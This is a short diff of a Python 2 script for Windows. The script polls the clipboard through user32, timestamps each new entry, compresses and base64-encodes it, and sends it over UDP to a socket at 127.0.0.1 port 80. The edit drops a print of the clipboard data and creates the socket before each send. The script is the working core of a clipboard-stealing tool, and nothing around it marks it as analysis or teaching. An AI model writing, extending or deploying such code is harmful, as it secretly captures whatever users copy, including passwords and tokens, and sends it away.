@@ -3,8 +3,6 @@ import ctypes
 import time
 import socket
 
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
 user32 = ctypes.windll.user32
 olddata = ""
 while True:
@@ -15,6 +13,6 @@ while True:
         time.sleep(5)
     else:
         olddata = clipdata
-        print clipdata
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         message = (str(time.time())+":"+clipdata).encode("bz2").encode("base64")
         s.sendto(message,("127.0.0.1",80))
